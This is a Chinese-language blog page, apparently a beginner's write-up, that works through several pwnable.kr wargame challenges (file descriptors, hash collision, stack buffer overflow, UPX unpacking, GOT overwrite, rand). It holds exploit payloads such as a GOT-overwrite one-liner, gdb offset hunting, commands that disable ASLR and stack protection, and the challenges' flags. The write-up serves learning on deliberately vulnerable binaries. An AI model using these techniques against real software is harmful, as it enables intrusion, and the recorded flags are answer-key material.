@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>pwnable.kr | Aizlm_blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="aizlm_Lin">
+  <meta name="keywords" content>
+  <meta name="description" content>
+  <script id="hexo-configurations">
+  var CONFIG = {
+    root: '/',
+    theme: 'lx',
+    version: '1.4.5',
+    localsearch:{
+      "enable": false,
+      "trigger": "auto",
+      "top_n_per_article": 1,
+      "unescape": false,
+      "preload": false
+      },
+    path: '-'
+  };
+</script>
+
+  <link rel="shortcut icon" href="/images/fav-1.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.jside.menu.js"></script>
+	<script>
+	$(document).ready(function(){
+	$(".menu-container").jSideMenu({
+	    jSidePosition: "position-right",
+	    jSideSticky: true,
+	    jSideSkin: "endless-river",
+	     });
+	}); 
+	</script>
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:300|Noto+Serif+SC&amp;display=swap">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+</head>
+<body>
+<div class="single">
+<div id="page">
+<div id="lx-aside" style="background-image: url(/images/bg-2.png)" data-stellar-background-ratio="0.5">
+  <div class="overlay">
+  <div class="page-title">
+    <div class="avatar"><a href="/"><img src="/images/ava-1.png"></a></div>
+    <span>2019-11-21</span>
+    <h2>pwnable.kr</h2>
+    
+    </div>
+</div>
+</div>
+<div id="lx-main-content">
+  <div class="lx-post">
+    <div class="lx-entry padding">
+      <div>
+        <p>ssh <a href="mailto:fd@pwnable.kr" target="_blank" rel="noopener">fd@pwnable.kr</a> -p2222<br>输入密码guest </p>
+<p><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/1-1.jpg" alt=" "><br>输入ls -l 查看文件 发现有三个文件fd fd.c flag<br>cat flag 返回permission denied 权限被拒绝<br>cat fd 出现乱码<br>cat fd.c 出现了代码 说明是可读的 </p>
+<blockquote>
+<p>fd和fd.c文件都只有读的权限，fd为fd.c编译出来的C程序，而flag则是要运行的夺旗程序</p>
+</blockquote>
+<p>如下:<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/1-2.jpg" alt=" "><br>查了网上大佬说明<br>argc为保存参数的数量的参数<br>argv[]是保存参数具体值的数组<br>envp是存放系统环境变量的数组<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/1-3.jpg" alt=" "><br>如果参数数量小于2 则输出pass argv[1] a number 且返回值0<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/1-4.jpg" alt=" "><br>atoi:将字符串转化为整形数据 将argv[1]转化成整形数据减去0x1234为fd的值</p>
+<p>#include &lt;unistd.h&gt;    </p>
+<p>ssize_t read(int fd, void *buf, size_t count);</p>
+<p>read（）会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read（）不会有作用并返回0.返回值为实际读取到的字节数，如果返回0，表示已经到达文件尾或是无可读取的数据，然后文件读写位置会随读取到的字节移动</p>
+<p>read函数从打开的设备或文件中读取数据。<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/1-5.jpg" alt="图片为fd即read函数的第一个参数可以设置为某些特殊参数的"><br>明显当fd=0时 要复制给buf的值就可以从键盘输入了</p>
+<p>返回值：成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0</p>
+<blockquote>
+<p>参数count<br>是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移。注意这个读写位置和使用C标准I/O库时的读写位置有可能不同，这个读写位置是记在内核中的，而使用C标准I/O库时的读写位置是用户空间I/O缓冲区中的位置。比如用fgetc读一个字节，fgetc有可能从内核中预读1024个字节到I/O缓冲区中，再返回第一个字节，这时该文件在内核中记录的读写位置是1024，而在FILE结构体中记录的读写位置是1。注意返回值类型是ssize_t，表示有符号的size_t，这样既可以返回正的字节数、0（表示到达文件末尾）也可以返回负值-1（表示出错）。<br>read函数返回时，返回值说明了buf中前多少个字节是刚读上来的。有些情况下，实际读到的字节数（返回值）会小于请求读的字节数count，例如：读常规文件时，在读到count个字节之前已到达文件末尾。例如，距文件末尾还有30个字节而请求读100个字节，则read返回30，下次read将返回0。from:UltraVires<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/1-6.jpg" alt=" "><br>strcmp比较“LETMEWIN”与buf中的数据，如果相同，则返回0，若大于，则返回大于0的值，小于则返回小于0的值</p>
+<blockquote>
+<p>要使这句话生效，要么相等返回0，然后非0得1，要么小于，这个小于的也好构造，把L改成L之前的任何一个数都行<br>system(“/bin/cat flag”);<br>调用系统调用，来输出flag</p>
+</blockquote>
+</blockquote>
+<p>fd呢是拥有者是fd_pwn，而flag的拥有者也是fd_pwn，所以这个时候这个代码执行后是有权限打开flag的。<br>然后我们怎么去改这个buf的内容呢，buf是从fd中读进去的数据，所以我们要改fd，要让fd读取我们的输入，这里就是linux的io接口知识 了。<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/1-7.jpg" alt=" "><br>网上大佬测试，发现fd为4660 4661 4662时都可以使得stremp比较成立 但不知道如何来的<br>这里要输入十进制数，而不是十六进制数<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/1-8.jpg" alt=" "><br>经过证明，flag=mommy！I think I know what a file descriptor is!!</p>
+<h1 id="pwnable-kr-2-col"><a href="#pwnable-kr-2-col" class="headerlink" title="pwnable.kr 2-col"></a>pwnable.kr 2-col</h1><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先建立链接 盲输入pw<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/2-1.jpg" alt=" "><br>然后还是一样的去查找文件 发现可读文件 cat出来<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/2-2.jpg" alt=" "></p>
+<blockquote>
+<p>if(strlen(argv[1]) != 20){<br>   printf(“passcode length should be 20 bytes\n”);<br>   return 0;<br>}<br>从main函数中可以看出argv[]的长度不等于20时 会提示passcode的长度必须时20字节的</p>
+</blockquote>
+<blockquote>
+<p>if(hashcode == check_password( argv[1] )){<br>   system(“/bin/cat flag”);<br>   return 0;<br>}<br>else<br>   printf(“wrong passcode.\n”);<br>return 0;<br>}<br>下句if说hashcode如果等于给出的argv[1]时 系统输出flag 返回值0 否则输出passcode错误</p>
+</blockquote>
+<blockquote>
+<p>unsigned long check_password(const char* p){<br>int* ip = (int<em>)p;<br>int i;<br>int res=0;<br>for(i=0; i&lt;5; i++){<br>   res += ip[i];<br>}<br>return res;<br>}<br>在语句中argv[]引用了password函数 看上去上面password函数里三个变量<br>for语句中说res为ip数组的和 ip数组的个数为5 而刚刚说到一共需要20个字节 则每个数组下应该就是4个字节<br><img src="/2019/11/21/pwnable-kr/2-3.jpg" alt=" "><br>这时就会想到令前四个字节为\x00\x00\x00\x00 *4  + 0xEC09DD21 *1 这样子进行输入 失败的原因从网上查询到的是<br>\x09是HTab，输入会被阻断。<br>所以自然而然的想去改变前四个字节换成\x01</em>16+\xe8\x05\xd9\x1d<br>然后就得到flag=daddy! I just managed to create a hash collision :)</p>
+</blockquote>
+<p>↓看看大佬的描述：from 参商ck 博客园</p>
+<blockquote>
+<p>源码的逻辑是从终端运行程序，输入一个值，第一步检查其长度是否为20，然后把这个数据经过一个check_password函数变化之后进行比较，所以突破点在于check_password这个函数。<br>现在我们看看check_password这个函数：<br>unsigned long check_password(const char* p){<br>   int* ip = (int*)p;<br>   int i;<br>   int res=0;<br>   for(i=0; i&lt;5; i++){<br>       res += ip[i];<br>   }<br>   return res;</p>
+</blockquote>
+<p>函数功能是将char类型的指针，转为int类型的指针，然后在将其相加，返回这五个值的和。char类型的为1个字节，int类型指针所占为4个字节，所以这用户输入的20个字符串将被分为5个组，然后相加值为0x21DD09EC，所以我们只需要构造一个字符串，这个字符串由五个16进制数据拼接而成}</p>
+<p>#需要的工具 终端下安装pwn gdb-peda</p>
+<p>源码中gets()一般都会栈溢出</p>
+<h1 id="pwnable-kr-3-bof"><a href="#pwnable-kr-3-bof" class="headerlink" title="pwnable.kr 3-bof"></a>pwnable.kr 3-bof</h1><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-1.png" alt=" "><br>看题 由于是个小白 所以看到就懵了 没有链接服务器的ssh 但是有让我下载的文件 就下下来看看<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-2.png" alt=" "></p>
+<blockquote>
+<p>bof.c文件:<br>int main(int argc, char* argv[]){<br>func(0xdeadbeef);<br>return 0;<br>}<br>首先看主函数 定义了两个变量 引用了func函数 返回值0 那么就去看func函数是怎么样的</p>
+</blockquote>
+<blockquote>
+<p>char overflowme[32];<br>printf(“overflow me : “);<br>首先func函数定义了一个变量key<br>然后定义了一个字符串数组 其中缓冲区为32个字节</p>
+</blockquote>
+<blockquote>
+<p>gets(overflowme);    // smash me!<br>if(key == 0xcafebabe){<br>   system(“/bin/sh”);<br>}<br>else{<br>   printf(“Nah..\n”);<br>}<br>}<br>输入overflowme 只有输入完足够的值 才能进行下一步if语句判断<br>如果key值和0xcafebabe相等 就能拿到flag了</p>
+</blockquote>
+<blockquote>
+<p>看了源码，我们很容易就发现，这道题它是比对函数调用传入的值和0xcafebabe的大小，如果相等，我们的flag就出来了。但是，这个传入的值确是已经被程序写死了。这就是本道题的矛盾之处。<br>但是我们再往下看，会发现有一个函数gets，我想这个函数是很明显的一个漏洞函数了，因为它读入数据的时候，不检查缓冲区的界限，很容易造成缓冲区溢出漏洞，所以我们一般用fgets函数来代替它。再联系一下题目中的 Nana told me that buffer overflow is one of the most common software vulnerability.,没错了，问题就出在这里。<br>我们可以通过往gets函数中输入足够多的数据，使缓冲区溢出，用我们输入的0xcafebabe覆盖之前压进栈的参数，就get 到 flag 啦～<br>from:五月的天气</p>
+</blockquote>
+<blockquote>
+<p>现在要知道的是需要多少数据压入栈中才能使得key与0xcafebabe相等 所以要改清楚偏移值<br>用gdb指令调试bof文件<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-3.png" alt=" "><br>b main指令查看断点    r指令运行查看断点值0x5655568d    disas func指令进行反汇编<br>可以看到func地址为0x5655562c<br>由0x00000654 &lt;+40&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe → if语句所在的地址为0x56555654 于是打一个断点</p>
+</blockquote>
+<p>运行b *0x56555654 设置0x56555654为断点 运行单步n<br>直到可以输入垃圾值overflowme时 输入比缓冲区个数多的值这里取33个a 使其溢出 从而试探出偏移值<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-4.png" alt=" "><br>此时输入 x /40wx $esp</p>
+<blockquote>
+<p>x /40xw $esp (x:以十六进制显示 w:以4字节为一个单位显示)<br>来查看从断点处起的40字节的内存值，由于esp是我们的程序流指针，其里面保存了程序在func栈中运行时的内存的变化<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-5.png" alt=" "></p>
+</blockquote>
+<p>看到这里有很多重复的61出现 a在内存中显示为\0x61 而A显示为\0x41(我感觉不用去记 输入了那么多相同的值 肯定有这么多重复的 除非倒霉到前或后出现连续的四个输入的值)<br>很明显从第一个\0x61开始到0xdeadbeef 有13组四个字节的地址 则偏移值就为13*4=52<br>所以这里我们只需要先将个数为52个字节数据压入栈中 后将0xdeadbeef压入栈中即可</p>
+<blockquote>
+<p>由于题目中提醒我们最后    Running at : nc pwnable.kr 9000<br>所以我们来写我们的exp<br>→(由于这里的# 和* *都无法显示)<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-6.png" alt=" "><br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-7.png" alt=" "></p>
+</blockquote>
+<p>最后在终端中运行我的python文件 得到我们的flag<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-8.png" alt=" "></p>
+<h1 id="第二道溢出题"><a href="#第二道溢出题" class="headerlink" title="第二道溢出题"></a>第二道溢出题</h1><p>src：<a href="https://github/xairy/easy-linux-pwn" target="_blank" rel="noopener">https://github/xairy/easy-linux-pwn</a><br>首先源码:<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-9.png" alt=" "><br>由于又是个溢出的问题</p>
+<blockquote>
+<p>因为cmp中的语句是f.x与一个值的对比 只要想的个就可以得到权限 那么只要得到我们read的函数要填充256个字节给buffer数组 而函数调用的时候会给数组分配一小部分的栈空间 这里就很明显溢出了 紧接着的就给了x 所以我们只需要把钱128个字节填充满 再把0xbeefc0de给压入栈中就可以了</p>
+<blockquote>
+<p>构造payload<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-10.png" alt=" "><br>python overflow.py 运行<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/3-11.png" alt=" "><br>/bin/sh 是获得所在列表的权限</p>
+</blockquote>
+</blockquote>
+<p>需要upx包 sudo apt-get install upx<br>需要ida 自行百度下载</p>
+<h1 id="pwnable-4-flag"><a href="#pwnable-4-flag" class="headerlink" title="pwnable 4-flag"></a>pwnable 4-flag</h1><ul>
+<li>过程<br>从pwnable.kr 上找到flag文件 下载下来 在路径下用终端输入upx -d flag -oflag_upx 生成flag_upx文件 #脱壳 也就是解压缩<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/4-1.png" alt=" "><br>借助ida工具在64位的环境下打开flag_upx 出现这样的界面<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/4-2.png" alt=" "><br>看到flag 跟进<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/4-3.png" alt=" "><br>看到flag这一行下有UPX…? sounds like a delivery service 输入pwnable.kr中的flag 出现wrong 说明这不是我最终要的flag<br>再跟进 aUpx___?SoundsL<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/4-4.png" alt=" "></li>
+</ul>
+<blockquote>
+<p>查看到 flag: UPX…? sounds like a delivery service : )</p>
+</blockquote>
+<p>ida使用: </p>
+<ul>
+<li>ctrl f 查找所需要了解的函数</li>
+<li>shift F12 弹出Strings Window（目前用到的）</li>
+</ul>
+<blockquote>
+<p>需要的知识点:</p>
+<blockquote>
+<p>got覆写技术:<br>GOT表: from:Jing0107<br>概念:每一个外部定义的符号在全局偏移表（Global offset Table）中有相应的条目，GOT位于ELF的数据段中，叫做GOT段。<br>作用：把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（rtld）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用rtld。<br>PLT表：<br>过程连接表(Procedure Linkage Table)，一个PLT条目对应一个GOT条目<br>当main()函数开始，会请求plt中这个函数的对应GOT地址，如果第一次调用那么GOT会重定位到plt，并向栈中压入一个偏移，程序的执行回到_init()函数，rtld得以调用就可以定位printf的符号地址，第二次运行程序再次调用这个函数时程序跳入plt，对应的GOT入口点就是真实的函数入口地址。<br>动态连接器并不会把动态库函数在编译的时候就包含到ELF文件中,仅仅是在这个ELF被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在ELF文件中的GOT中保留一个调用地址.</p>
+<blockquote>
+<p>攻击原理 ：由于GOT表是可以写入的，所以将GOT表中要调用的函数地址覆盖成我们shell code的地址就可以了</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>fflush(stdin); from:百度百科<br>功能是清空输入缓冲区，通常是为了确保不影响后面的数据读取（例如在读完一个字符串后紧接着又要读取一个字符，此时应该先执行fflush(stdin);）。</p>
+<blockquote>
+<p>int fflush(FILE*stream); (有点看不懂的 万一哪一天看懂了呢)<br>如果stream指向输出流或者更新流（update stream），并且这个更新流<br>最近执行的操作不是输入，那么fflush函数将把任何未被写入的数据写入stream<br>指向的文件（如标准输出文件stdout）。否则，fflush函数的行为是不确定的。<br>fflush（NULL）清空所有输出流和上面提到的更新流。如果发生写错误，fflush<br>函数会给那些流打上错误标记，并且返回EOF，否则返回0。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><p>先连上服务器 然后看源码<br><img src="/2019/11/21/pwnable-kr/5-1.png" alt=" "><br>这里的scanf函数对passcode1和passcode2没有进行取地址 将会导致scanf把passcode1和passcode2中的值作为存储输入的地址 而直接运行可执行文件时 输入if所对应的值时 出现了段错误 则指针指向了一个不可执行的地址 这里就要想到用got覆写技术 因为got表是可写的 将passcode1或passcode2的地址覆写成其他的地址 使其可以执行</p>
+<p>经过网上查找 还有自己本地调试 主要是由于不知道怎么从服务器将文件传输出来 发现welcome 和login 的ebp是相同的 然后在服务器上gdb调试passcode<br><img src="/2019/11/21/pwnable-kr/5-2.png" alt=" "><br><img src="/2019/11/21/pwnable-kr/5-3.png" alt=" "></p>
+<p>对照源码看出name的地址为ebp-0x70 passcode1的地址为ebp-0x10 passcode2的地址为ebp-0xc 因为ebp相同 所以name和passcode1的偏移为70h=96B 同处于一个栈空间中 函数运行时会分配一小部分栈来保存局部变量之类的空间 这里的name数组就有空间大小为100B的栈 且正好可以覆盖到passcode1 name和passcode2的偏移为100B</p>
+<p>因为我们需要flag文件 将name的最后四个字节赋值成plt中的printf的地址 fflush()之前的printf函数 当然plt表中也只有它一个printf函数 然后将passcode1的值覆写成system的地址 就可以在执行passcode1时进入system函数得到flag了 </p>
+<blockquote>
+<p>注意函数调用前还有给参数赋值等初始化操作，因此这个地址在 call system 语句的前面一点点 所以覆写system的地址时应是0x080485e3 而不是0x080485ea</p>
+</blockquote>
+<p>readelf -r passcode 查询plt<br><img src="/2019/11/21/pwnable-kr/5-4.png" alt=" "></p>
+<p>然后构造我们的payload:(因为这里passcode1输入是要求%d 所以要将system的地址转化为十进制的 为134514147)<br>python -c “print’a’*96 + ‘\x00\xa0\x04\x08’ + ‘134514147’” | ./passcode<br>就得到flag了<br><img src="/2019/11/21/pwnable-kr/5-5.png" alt=" "></p>
+<blockquote>
+<p>插入点知识:(听我同学说超级重要 我也觉得 舔狗)<br>checksec ./file #查看可执行文件开启的保护<br><img src="/2019/11/21/pwnable-kr/5-6.png" alt=" "><br>从图中可以看到文件属于32位文件 开启了NX保护和栈溢出保护</p>
+<blockquote>
+<p>Stack:Canary found就是开启栈溢出保护<br>cc -fno-stack-protector -o file name #禁用栈保护<br>cc -fstack-protector -o file name #启用堆栈保护,只为局部变量中含有char数组的函数插入保护代码<br>cc -fstack-protector-all -o file name # 启用堆栈保护,为所有函数插入保护代码<br>RELRO:分两种 一种是partial relro 还有一种就是full relro 第一种是文件默认的选择部分RELRO 这种除了.got.plt可写以外都只有只读权限 第二种全RELRO就是拥有partial RELRO的所有特性 而且在这基础上连got表都不可写<br>NX(DEP):文件默认开启选项 no-execute不可执行 将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。(网上转载的) 编译时关掉指令:cc -z execstack -o file name<br>windows下叫做DEP<br>PIE(ASLR):地址空间分布随机化<br>0 - 表示关闭进程地址空间随机化<br>1 - 表示将mmap的基址,stack和vdso页面随机化<br>2 - 表示在1的基础上增加栈的随机化<br>与NX配合使用 能有效阻止攻击者在堆栈上运行恶意代码<br>关闭PIE: sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
+</blockquote>
+</blockquote>
+<ul>
+<li>from ddd0ng 补充<br>Partial RELRO<br>现在gcc 默认编译就是 partial relro（很久以前可能需要加上选项 gcc -Wl,-z,relro）<br>some sections(.init_array .fini_array .jcr .dynamic .got) are marked as read-only after they have been initialized by the dynamic loader<br>non-PLT GOT is read-only (.got)<br>GOT is still writeable (.got.plt)<br>Full RELRO<br>拥有 Partial RELRO 的所有特性<br>lazy resolution 是被禁止的，所有导入的符号都在 startup time 被解析<br>bonus: the entire GOT is also (re)mapped as read-only or the .got.plt section is completely initialized with the final addresses of the target functions (Merge .got and .got.plt to one section .got). Moreover,since lazy resolution is not enabled, the GOT[1] and GOT[2] entries are not initialized.<br>GOT[0] is a the address of the module’s DYNAMIC section. GOT[1] is the virtual load address of the link_map, GOT[2] is the address for the runtime resolver function<br>编译时需要加上选项 gcc -Wl,-z,relro,-z,now<br>其中-z 参数是把-z 后面的 keyword 传给linker ld</li>
+</ul>
+<h1 id="pwnable-kr-6-random"><a href="#pwnable-kr-6-random" class="headerlink" title="pwnable.kr 6-random"></a>pwnable.kr 6-random</h1><ul>
+<li>^ 异或符 二进制相同为1 不同为0</li>
+<li>rand()函数 本身是一个产生伪随机数的随机函数<br>srand()是随机数生成器的初始化器 在rand()函数使用之前使用一次 就可以每一次都生成不一样的随机数序列<br>需要的头文件 #include &lt;stdlib.h&gt;</li>
+</ul>
+<blockquote>
+<p>链接服务器ssh <a href="mailto:random@pwnable.kr" target="_blank" rel="noopener">random@pwnable.kr</a> -p2222 pw:guest<br>源码,检查保护机制:<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/6-1.png" alt=" "><br>这里用了rand()赋值给random 产生随机数序列 不会变的随机数序列 然后我们要输入一个key 使得这两个值的异或 与 0xdeadbeef相等 之后就可以得到flag了<br>首先要将random值得到才可以得出我们需要输入的值是多少<br>编写c程序:<br><img src="/2019/11/21/pwnable-kr/aizlm/Desktop/aizlm_blog/source/_posts/6-2.png" alt=" "><br>得出random值 以及将其与0xdeadbeef异或运算后的值就是需要输入的key值<br>在服务器终端中运行random可执行文件 得到flag<br><img src="/2019/11/21/pwnable-kr/6-3.png" alt=" "></p>
+</blockquote>
+<ul>
+<li><p>int memcmp(const void *buf1,const void *buf2,unsigned int count); #const限定变量不允许改变<br>比较内存区域buf1和buf2的前count个字节 #按字节比较<br>头文件 #include &lt;string.h&gt; 或 #include &lt;memory.h&gt;<br>if buf1&lt;buf2 , 返回值&lt;0<br>if buf1==buf2 , 返回值=0<br>if buf1&gt;buf2 , 返回值&gt;0</p>
+</li>
+<li><p>extern int strcmp(const char *s1,const char *s2); #extern可置于变量或函数前,以表示变量或者函数的定义在别的文件,遇到此变量时,在其他模块中寻找其定义,此外，也可以用来进行链接指定<br>两个字符串自左向右逐个字符相比 按ASCII值大小比较<br>头文件 #include &lt;string.h&gt;<br>设这两个字符串为str1，str2，<br>若str1=str2，则返回零；<br>若str1&lt;str2，则返回负数；<br>若str1&gt;str2，则返回正数。</p>
+</li>
+<li><p>char *getenv(char *envvar) #envvar为环境变量的名称,若该变量存在则会返回指向该内容的指针,格式为envvar=value<br>从环境中取字符串,获取环境变量的值</p>
+</li>
+<li><p>FILE *fopen(const char *path,const char *mode);  #参数 path字符串包含欲打开的文件路径及文件名，参数 mode 字符串则代表着流形态<br>返回值：文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回 NULL，并把错误代码存在error中</p>
+</li>
+<li><p>int fclose( FILE *fp ); 关闭流</p>
+</li>
+<li><p>size_t fread(void *buffer,size_t size,size_t count,FILE *stream); #buffer用于接收数据的内存地址 stream输入流<br>fread是一个函数，它从文件流中读数据，最多读取count个项，每个项size个字节，如果调用成功返回实际读取到的项个数（小于或等于count），如果不成功或读到文件末尾返回 0。</p>
+</li>
+<li><p>input pwnable.kr (这题不会啊 后面学的差不多了再回头看看吧)</p>
+</li>
+</ul>
+<p>源码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">    printf(&quot;Welcome to pwnable.kr\n&quot;);</span><br><span class="line">    printf(&quot;Let&apos;s see if you know how to give input to program\n&quot;);</span><br><span class="line">    printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;);</span><br><span class="line"></span><br><span class="line">    // argv</span><br><span class="line">    if(argc != 100) return 0;</span><br><span class="line">    if(strcmp(argv[&apos;A&apos;],&quot;\x00&quot;)) return 0;</span><br><span class="line">    if(strcmp(argv[&apos;B&apos;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">    printf(&quot;Stage 1 clear!\n&quot;); </span><br><span class="line"></span><br><span class="line">    // stdio</span><br><span class="line">    char buf[4];</span><br><span class="line">    read(0, buf, 4);</span><br><span class="line">    if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">    read(2, buf, 4);</span><br><span class="line">        if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">    printf(&quot;Stage 2 clear!\n&quot;);</span><br><span class="line">    </span><br><span class="line">    // env</span><br><span class="line">    if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">    printf(&quot;Stage 3 clear!\n&quot;);</span><br><span class="line"></span><br><span class="line">    // file</span><br><span class="line">    FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">    if(!fp) return 0;</span><br><span class="line">    if( fread(buf, 4, 1, fp)!=1 ) return 0;</span><br><span class="line">    if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    printf(&quot;Stage 4 clear!\n&quot;); </span><br><span class="line"></span><br><span class="line">    // network</span><br><span class="line">    int sd, cd;</span><br><span class="line">    struct sockaddr_in saddr, caddr;</span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    if(sd == -1)&#123;</span><br><span class="line">        printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[&apos;C&apos;]) );</span><br><span class="line">    if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">        printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">            return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, 1);</span><br><span class="line">    int c = sizeof(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">    if(cd &lt; 0)&#123;</span><br><span class="line">        printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if( recv(cd, buf, 4, 0) != 4 ) return 0;</span><br><span class="line">    if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">    printf(&quot;Stage 5 clear!\n&quot;);</span><br><span class="line"></span><br><span class="line">    // here&apos;s your flag</span><br><span class="line">    system(&quot;/bin/cat flag&quot;);    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python解题脚本:</p>
